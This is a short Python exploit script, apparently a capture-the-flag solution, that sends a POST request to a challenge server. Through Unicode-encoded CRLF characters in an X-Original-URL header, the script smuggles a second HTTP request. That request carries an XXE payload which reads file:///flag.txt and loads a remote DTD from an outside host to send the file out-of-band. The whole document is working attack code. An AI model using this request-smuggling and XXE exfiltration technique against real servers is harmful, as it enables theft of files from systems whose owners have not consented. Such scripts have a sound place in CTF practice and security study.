import requests
import urllib

HOST = "http://eductf.zoolab.org:18787/connect"
CRLF = "%E5%98%8D%E5%98%8A"
xxe = '''<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % remote SYSTEM "http://kaibro.tw/xxe.dtd">
%remote;
%all;
%send;
]>'''

# Have to keep connection alive or the fake HTTP request after the real one won't be handled
payload = "a" + CRLF + "Connection%3Akeep-alive" + CRLF + CRLF + "POST%20/api%20HTTP/1.1" + CRLF + "Content-length%3A{}".format(len(xxe)) + CRLF + "Connection%3Aclose" + CRLF + CRLF + urllib.quote(xxe)
data = {"names": ["a","b"]}

# X-Original-URL will be decoded by urldecode in server
r = requests.post(HOST, headers={"X-Original-URL":payload, "X-Forwarded-For":"a"}, json=data)
print(r.headers, r.text)
